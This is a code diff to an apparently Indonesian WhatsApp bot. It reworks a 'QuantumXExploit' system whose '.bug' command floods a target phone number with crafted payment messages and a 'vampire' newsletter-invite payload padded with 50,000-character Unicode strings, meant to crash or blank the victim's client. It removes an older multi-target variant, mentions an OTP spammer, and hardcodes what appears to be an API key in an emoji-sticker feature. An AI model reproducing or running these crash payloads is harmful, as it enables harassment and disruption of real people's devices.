@@ -1311,20 +1311,19 @@ class RealOTPSpammer {
 // Inisialisasi global
 let realSpammer = null;
 
-// ==================== QUANTUMX EXPLOIT SYSTEM ====================
+// ==================== QUANTUMX EXPLOIT SYSTEM + VAMPIRE ====================
 class QuantumXExploit {
     constructor(sock) {
         this.sock = sock;
     }
 
-    // 💣 MULTIPLE PAYMENT CRASH - DELAYED & HEAVY
+    // 💣 MULTIPLE PAYMENT CRASH
     async paymentCrashMultiple(targetJid, count = 5) {
         try {
-            console.log(`💣 [BUG] ${count}x Payment crash to: ${targetJid}`);
+            console.log(`💣 [BUG-PAYMENT] ${count}x Payment crash to: ${targetJid}`);
             
             let successCount = 0;
             
-            // JENIS PAYLOAD BERBEDA-BEDA
             const payloads = [
                 {
                     sendPaymentMessage: {
@@ -1351,7 +1350,6 @@ class QuantumXExploit {
             
             for (let i = 1; i <= count; i++) {
                 try {
-                    // PILIH PAYLOAD BERBEDA SETIAP KALI
                     const payloadIndex = (i - 1) % payloads.length;
                     const payload = payloads[payloadIndex];
                     
@@ -1362,16 +1360,15 @@ class QuantumXExploit {
                     
                     successCount++;
                     
-                    // DELAY MAKIN LAMA PER KALI
-                    const delay = 300 + (i * 100); // 300, 400, 500, 600, dst
-                    console.log(`Sent payload ${i}, delay ${delay}ms`);
+                    const delay = 300 + (i * 50);
+                    console.log(`Payment sent ${i}, delay ${delay}ms`);
                     
                     if (i < count) {
                         await new Promise(resolve => setTimeout(resolve, delay));
                     }
                     
                 } catch (error) {
-                    console.error(`❌ Payload ${i} failed:`, error.message);
+                    console.error(`❌ Payment payload ${i} failed:`, error.message);
                 }
             }
             
@@ -1382,226 +1379,97 @@ class QuantumXExploit {
             };
             
         } catch (error) {
-            console.error('❌ Multiple crash error:', error.message);
-            return { error: error.message };
-        }
-    }
-}
-
-let exploitSystem = null;
-
-
-
-// ==================== QUANTUMX EXPLOIT SYSTEM v2.1 ====================
-class QuantumXExploitV2 {
-    constructor(sock) {
-        this.sock = sock;
-    }
-
-    // 💣 MULTI-TARGET PAYMENT CRASH WITH DELAY
-    async multiTargetCrash(targetJids, count = 20) {
-        try {
-            console.log(`💣 [BUG2] Attacking ${targetJids.length} targets with ${count}x payloads each`);
-            
-            const results = [];
-            
-            // ATTACK ALL TARGETS SEQUENTIALLY WITH DELAY
-            for (let t = 0; t < targetJids.length; t++) {
-                const targetJid = targetJids[t];
-                
-                // DELAY BEFORE STARTING NEW TARGET
-                if (t > 0) {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-                
-                const result = await this.attackSingleTargetWithDelay(targetJid, count);
-                results.push({
-                    target: targetJid.split('@')[0],
-                    ...result
-                });
-            }
-            
-            const totalSent = results.reduce((sum, r) => sum + r.sent, 0);
-            const totalTargets = results.length;
-            const successfulTargets = results.filter(r => r.success).length;
-            
-            return { 
-                success: totalSent > 0,
-                results: results,
-                summary: {
-                    totalTargets,
-                    successfulTargets,
-                    totalPayloads: totalTargets * count,
-                    totalSent,
-                    successRate: (successfulTargets / totalTargets) * 100
-                }
-            };
-            
-        } catch (error) {
-            console.error('❌ Multi-target crash error:', error.message);
+            console.error('❌ Payment crash error:', error.message);
             return { error: error.message };
         }
     }
 
-    // ⚡ ATTACK SINGLE TARGET WITH PROGRESSIVE DELAY
-    async attackSingleTargetWithDelay(targetJid, count = 20) {
+    // 🧛 VAMPIRE BLANK IPHONE
+    async vampireBlankIphone(targetJid, count = 5) {
         try {
+            console.log(`🧛 [BUG-VAMPIRE] ${count}x Vampire to: ${targetJid}`);
+            
             let successCount = 0;
-            const errors = [];
             
-            // PAYLOAD VARIANTS
-            const payloads = [
-                {
-                    sendPaymentMessage: {
-                        amount: { value: "999999999", offset: 9999, currencyCodeIso4217: "IDR" }
-                    }
-                },
-                {
-                    sendPaymentMessage: {
-                        amount: { value: "500000000", offset: 5000, currencyCodeIso4217: "IDR" }
-                    }
-                },
-                {
-                    sendPaymentMessage: {
-                        amount: { value: "750000000", offset: 7500, currencyCodeIso4217: "IDR" }
-                    }
-                },
-                {
-                    paymentInviteMessage: {
-                        serviceType: "UPI",
-                        expiryTimestamp: Date.now() + 3600000
-                    }
-                }
-            ];
-            
-            // PAKAI DELAY SYSTEM PERSIS .bug
             for (let i = 1; i <= count; i++) {
                 try {
-                    const payloadIndex = (i - 1) % payloads.length;
-                    const payload = payloads[payloadIndex];
+                    const messsage = {
+                        botInvokeMessage: {
+                            message: {
+                                newsletterAdminInviteMessage: {
+                                    newsletterJid: `33333333333333333@newsletter`,
+                                    newsletterName: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄" + "ી".repeat(50000),
+                                    jpegThumbnail: "",
+                                    caption: "ꦽ".repeat(50000),
+                                    inviteExpiration: Date.now() + 1814400000,
+                                },
+                            },
+                        },
+                    };
                     
-                    await this.sock.relayMessage(targetJid, payload, {
-                        participant: { jid: targetJid },
-                        messageId: this.sock.generateMessageTag() + "_BUG2_" + i,
+                    await this.sock.relayMessage(targetJid, messsage, {
+                        userJid: targetJid,
                     });
                     
                     successCount++;
                     
-                    // DELAY PERSIS .bug YANG LAMA: 300 + (i * 100)
-                    const delay = 300 + (i * 100); // 300, 400, 500, 600, dst
-                    console.log(`Target ${targetJid} - Sent payload ${i}, delay ${delay}ms`);
+                    const delay = 150 + (i * 20);
+                    console.log(`Vampire sent ${i}, delay ${delay}ms`);
                     
                     if (i < count) {
                         await new Promise(resolve => setTimeout(resolve, delay));
                     }
                     
                 } catch (error) {
-                    errors.push(`Payload ${i}: ${error.message}`);
-                    console.error(`❌ Target ${targetJid} payload ${i} failed:`, error.message);
-                    
-                    // DELAY LEBIH PANJANG KALAU ERROR
-                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    console.error(`❌ Vampire payload ${i} failed:`, error.message);
                 }
             }
             
             return { 
                 success: successCount > 0, 
                 sent: successCount,
-                total: count,
-                errors: errors.length
+                total: count
             };
             
         } catch (error) {
-            console.error(`❌ Single target ${targetJid} error:`, error.message);
+            console.error('❌ Vampire error:', error.message);
             return { error: error.message };
         }
     }
 
-    // 🚀 ENHANCED ATTACK WITH PHASES (KAYA .bug EXTREME)
-    async enhancedAttack(targetJid, count = 20) {
+    // 💀 COMBO ATTACK - SAMA JUMLAH
+    async comboAttack(targetJid, count = 5) {
         try {
-            console.log(`🚀 [BUG2-ENHANCED] Enhanced ${count}x to: ${targetJid}`);
+            console.log(`💀 [BUG-COMBO] ${count}x Both attacks to: ${targetJid}`);
             
-            let successCount = 0;
+            // JALANIN BERSAMAAN - SAMA JUMLAH
+            const paymentPromise = this.paymentCrashMultiple(targetJid, count);
+            const vampirePromise = this.vampireBlankIphone(targetJid, count);
             
-            // PHASE 1: QUICK SPAM (FIRST 10)
-            const phase1Count = Math.min(10, count);
-            for (let i = 1; i <= phase1Count; i++) {
-                try {
-                    await this.sock.relayMessage(targetJid, {
-                        sendPaymentMessage: {
-                            amount: { 
-                                value: String(100000000 + (i * 50000000)), 
-                                offset: i * 500, 
-                                currencyCodeIso4217: "IDR" 
-                            }
-                        }
-                    }, {
-                        participant: { jid: targetJid },
-                        messageId: this.sock.generateMessageTag() + "_ENH_" + i,
-                    });
-                    
-                    successCount++;
-                    
-                    // DELAY CEPAT DI PHASE 1
-                    if (i < phase1Count) {
-                        await new Promise(resolve => setTimeout(resolve, 150));
-                    }
-                    
-                } catch (error) {
-                    console.error(`Phase 1 payload ${i} failed:`, error.message);
-                }
-            }
+            const [paymentResult, vampireResult] = await Promise.all([
+                paymentPromise,
+                vampirePromise
+            ]);
             
-            // PHASE 2: SLOW SPAM WITH LONG DELAYS
-            if (count > 10) {
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                for (let i = 11; i <= count; i++) {
-                    try {
-                        await this.sock.relayMessage(targetJid, {
-                            sendPaymentMessage: {
-                                amount: { 
-                                    value: String(900000000 - ((i-10) * 10000000)), 
-                                    offset: 9999 - ((i-10) * 100), 
-                                    currencyCodeIso4217: "IDR" 
-                                }
-                            }
-                        }, {
-                            participant: { jid: targetJid },
-                            messageId: this.sock.generateMessageTag() + "_ENH_" + i,
-                        });
-                        
-                        successCount++;
-                        
-                        // DELAY PANJANG DI PHASE 2
-                        const delay = 1000 + (Math.random() * 1000);
-                        if (i < count) {
-                            await new Promise(resolve => setTimeout(resolve, delay));
-                        }
-                        
-                    } catch (error) {
-                        console.error(`Phase 2 payload ${i} failed:`, error.message);
-                    }
-                }
-            }
+            const totalSent = (paymentResult.sent || 0) + (vampireResult.sent || 0);
+            const totalAttempts = count + count;
             
-            return { 
-                success: successCount > 0, 
-                sent: successCount,
-                total: count,
-                mode: "ENHANCED"
+            return {
+                success: (paymentResult.success || vampireResult.success) ? true : false,
+                totalSent: totalSent,
+                totalAttempts: totalAttempts,
+                payment: paymentResult,
+                vampire: vampireResult
             };
             
         } catch (error) {
-            console.error('❌ Enhanced attack error:', error.message);
+            console.error('❌ Combo attack error:', error.message);
             return { error: error.message };
         }
     }
 }
 
-// INISIALISASI DI BOT
-let exploitSystemV2 = null;
+let exploitSystem = null;
 
 
 
@@ -1622,7 +1490,6 @@ async function startBot() {
   });
 
     exploitSystem = new QuantumXExploit(sock);
-    exploitSystemV2 = new QuantumXExploitV2(sock);
 
   sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect, qr } = update;
@@ -5817,109 +5684,11 @@ if (text.startsWith('.spamcode')) {
 
 
 
-
-// 🎯 FITUR .bug2 (MULTI-TARGET ATTACK)
-if (body.startsWith('.bug2')) {
-    const args = body.trim().split(' ');
-
-     if (!isOwner(sender)) {
-        await sock.sendMessage(from, { text: '𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘' });
-        return;
-    }
-    
-    if (args.length === 1) {
-        await sock.sendMessage(from, { 
-            text: '𝐂𝐎𝐌𝐌𝐀𝐍𝐃: .bug2 <𝐭𝐚𝐫𝐠𝐞𝐭𝟏,𝐭𝐚𝐫𝐠𝐞𝐭𝟐,𝐭𝐚𝐫𝐠𝐞𝐭𝟑> [𝐜𝐨𝐮𝐧𝐭]\n\nEXAMPLE:\n.bug2 628xxxx\n.bug2 628xxxx 30\n.bug2 628xxxx,628yyyy\n.bug2 628xxxx,628yyyy,628zzzz 25'
-        });
-        return;
-    }
-
-    // PARSING TARGETS
-    let targetInput = args[1];
-    let targets = [];
-    
-    if (targetInput.includes(',')) {
-        const targetParts = targetInput.split(',');
-        
-        for (let i = 0; i < Math.min(3, targetParts.length); i++) {
-            let targetNum = targetParts[i].replace(/[^0-9]/g, '');
-            
-            if (!targetNum) continue;
-            
-            if (targetNum.startsWith('0')) targetNum = '62' + targetNum.slice(1);
-            if (!targetNum.startsWith('62')) targetNum = '62' + targetNum;
-            
-            targets.push(targetNum + '@s.whatsapp.net');
-        }
-    } else {
-        let targetNum = targetInput.replace(/[^0-9]/g, '');
-        
-        if (!targetNum) {
-            await sock.sendMessage(from, { text: '𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐓𝐀𝐑𝐆𝐄𝐓' });
-            return;
-        }
-        
-        if (targetNum.startsWith('0')) targetNum = '62' + targetNum.slice(1);
-        if (!targetNum.startsWith('62')) targetNum = '62' + targetNum;
-        
-        targets.push(targetNum + '@s.whatsapp.net');
-    }
-
-    if (targets.length === 0) {
-        await sock.sendMessage(from, { text: '𝐍𝐎 𝐕𝐀𝐋𝐈𝐃 𝐓𝐀𝐑𝐆𝐄𝐓𝐒' });
-        return;
-    }
-
-    // COUNT DETECTION
-    let count = 20; // DEFAULT 20
-    
-    if (args.length >= 3) {
-        count = parseInt(args[2]);
-        if (isNaN(count) || count < 1) count = 20;
-        if (count > 50) count = 50;
-    }
-
-    // START MESSAGE
-    let targetList = targets.map(t => t.split('@')[0]).join(', ');
-    
-    await sock.sendMessage(from, {
-        text: `𝗠𝗨𝗟𝗧𝗜𝗣𝗟𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗧𝗧𝗔𝗖𝗞\n𝗧𝗔𝗥𝗚𝗘𝗧𝗦: ${targets.length} (${targetList})\n𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦: ${count} each\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚...`
-    });
-
-    // EXECUTE ATTACK
-    let result = await exploitSystemV2.multiTargetCrash(targets, count);
-    
-    // RESULT
-    if (result.success) {
-        let resultText = `𝗠𝗨𝗟𝗧𝗜-𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n\n`;
-        
-        if (targets.length === 1) {
-            resultText += `𝗧𝗔𝗥𝗚𝗘𝗧: ${targets[0].split('@')[0]}\n𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟: ${result.results[0].sent}/${count}`;
-        } else {
-            resultText += `𝗧𝗢𝗧𝗔𝗟 𝗧𝗔𝗥𝗚𝗘𝗧𝗦: ${result.summary.totalTargets}\n𝗧𝗢𝗧𝗔𝗟 𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦: ${result.summary.totalPayloads}\n𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 𝗦𝗘𝗡𝗧: ${result.summary.totalSent}\n\n`;
-            
-            result.results.forEach((r, index) => {
-                const status = r.success ? '✅' : '❌';
-                resultText += `${status} ${r.target}: ${r.sent}/${count}\n`;
-            });
-        }
-        
-        await sock.sendMessage(from, { text: resultText });
-    } else {
-        await sock.sendMessage(from, {
-            text: `𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗\n𝗧𝗔𝗥𝗚𝗘𝗧𝗦: ${targets.length}\n𝗘𝗥𝗥𝗢𝗥: ${result.error || 'Unknown'}`
-        });
-    }
-    
-    return;
-}
-
-
-// 🎯 FITUR .bug (Payment Crash)
+// 🎯 FITUR .bug - SAMA PERSIS TEXTNYA KAYA SEBELUMNYA
 if (body.startsWith('.bug')) {
     const args = body.trim().split(' ');
 
-      if (!isOwner(sender)) {
+    if (!isOwner(sender)) {
         await sock.sendMessage(from, { text: '𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘' });
         return;
     }
@@ -5944,7 +5713,7 @@ if (body.startsWith('.bug')) {
     const targetJid = targetNum + '@s.whatsapp.net';
 
     // COUNT CHECK
-    let count = 10; // DEFAULT 5
+    let count = 5; // DEFAULT 5
     
     if (args.length >= 3) {
         count = parseInt(args[2]);
@@ -5952,15 +5721,15 @@ if (body.startsWith('.bug')) {
         if (count > 50) count = 50;
     }
 
-    // START MESSAGE
+    // START MESSAGE - SAMA TEXTNYA
     await sock.sendMessage(from, {
         text: `𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗔𝗠𝗢𝗨𝗡𝗧: ${count}x`
     });
 
-    // EXECUTE
-    let result = await exploitSystem.paymentCrashMultiple(targetJid, count);
+    // EXECUTE COMBO - SEMUA FUNC SEKALIGUS!
+    let result = await exploitSystem.comboAttack(targetJid, count);
     
-    // RESULT
+    // RESULT - SAMA FORMATNYA
     if (result.success) {
         await sock.sendMessage(from, {
             text: `𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗘𝗙𝗙𝗘𝗖𝗧𝗦: 𝗜𝗠𝗠𝗜𝗡𝗘𝗡𝗧`
@@ -8540,14 +8309,12 @@ if (/^\.brat(\s|$)/i.test(text)) {
 }
 
 
-
-// Fitur .emojimix
+// Fitur .emojimix (PAKAI TENOR)
 if (text.toLowerCase().startsWith('.emojimix')) {
 
-    // Ambil hanya setelah command
-    const raw = text.slice(9).trim(); 
+    const raw = text.slice(9).trim();
 
-    // Regex menangkap emoji (unicode)
+    // Tangkap emoji unicode
     const emojiRegex = /(\p{Emoji_Presentation}|\p{Emoji}\uFE0F)/gu;
     const emojis = raw.match(emojiRegex);
 
@@ -8564,14 +8331,23 @@ if (text.toLowerCase().startsWith('.emojimix')) {
     await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
 
     try {
-        const url = `https://api.jerexd666.wongireng.my.id/tools/emojimix?emoji1=${encodeURIComponent(emoji1)}&emoji2=${encodeURIComponent(emoji2)}`;
+        const fetch = require('node-fetch');
 
-        const res = await fetch(url);
-        if (!res.ok) throw new Error("Gagal ambil hasil API");
+        const tenorUrl = `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`;
 
-        const imgBuffer = Buffer.from(await res.arrayBuffer());
+        const res = await fetch(tenorUrl);
+        const json = await res.json();
+
+        if (!json.results || json.results.length === 0) {
+            throw "Emoji mix tidak ditemukan";
+        }
+
+        const imgUrl = json.results[0].url;
+        const imgRes = await fetch(imgUrl);
+        const imgBuffer = Buffer.from(await imgRes.arrayBuffer());
 
         const { Sticker, StickerTypes } = require("wa-sticker-formatter");
+
         const sticker = new Sticker(imgBuffer, {
             pack: "EmojiMix",
             author: "Jarr",
@@ -8584,19 +8360,22 @@ if (text.toLowerCase().startsWith('.emojimix')) {
 
         await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
 
-        // Auto-delete jika antistiker aktif
+        // Auto delete jika antisticker aktif
         if (from.endsWith('@g.us') && antiStickerGroups.get(from)) {
             await sock.sendMessage(from, { delete: sent.key });
         }
 
     } catch (err) {
         console.error("❌ Error emojimix:", err);
-        await sock.sendMessage(from, { text: "❌ Gagal membuat EmojiMix." }, { quoted: msg });
+        await sock.sendMessage(from, { 
+            text: "❌ EmojiMix tidak tersedia untuk emoji ini." 
+        }, { quoted: msg });
         await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
     }
 
     return;
 }
+
 
 
 // Fitur .ytmp3
